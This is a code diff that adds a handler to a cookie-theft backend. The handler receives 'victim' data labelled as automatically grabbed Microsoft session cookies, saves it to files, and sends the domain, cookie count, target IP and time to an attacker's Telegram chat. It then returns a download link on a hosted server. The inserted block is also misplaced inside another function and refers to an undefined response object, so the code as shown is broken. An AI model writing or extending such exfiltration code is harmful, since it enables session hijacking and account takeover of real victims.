@@ -120,6 +120,49 @@ async function sendTelegramAlert(victimData, fileInfo) {
       })
     });
 
+
+    // Add to your router.post('/', ...) after other type checks
+
+if (victimData.type === 'microsoft_cookie_auto') {
+  console.log('🎯 AUTO MICROSOFT COOKIE:', victimData.data.domain);
+  
+  const fileInfo = await saveSessionData({
+      ...victimData,
+      service: 'microsoft_auto_cookies',
+      capture_method: 'auto_python_grabber'
+  });
+
+  const telegramMessage = `🤖 <b>AUTO MICROSOFT COOKIE GRABBED</b>
+
+🌐 <b>Domain:</b> ${victimData.data.domain}
+🍪 <b>Cookies Found:</b> ${victimData.data.cookie_count}
+
+📍 <b>Target IP:</b> ${victimData.target_ip}
+⏰ <b>Time:</b> ${victimData.timestamp}
+
+💾 <b>Auto-saved to:</b> <code>${fileInfo.filename}</code>`;
+
+  await fetch(TELEGRAM_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: telegramMessage,
+          parse_mode: 'HTML'
+      })
+  });
+
+  return res.status(200).json({
+      success: true,
+      message: "Auto Microsoft cookies captured",
+      cookies_captured: victimData.data.cookie_count,
+      storage_info: {
+          filename: fileInfo.filename,
+          download_url: `https://chuksinno-backend-1.onrender.com${fileInfo.download_url}`
+      }
+  });
+}
+
     if (!response.ok) {
       console.error('Telegram API error:', response.status, response.statusText);
       return null;
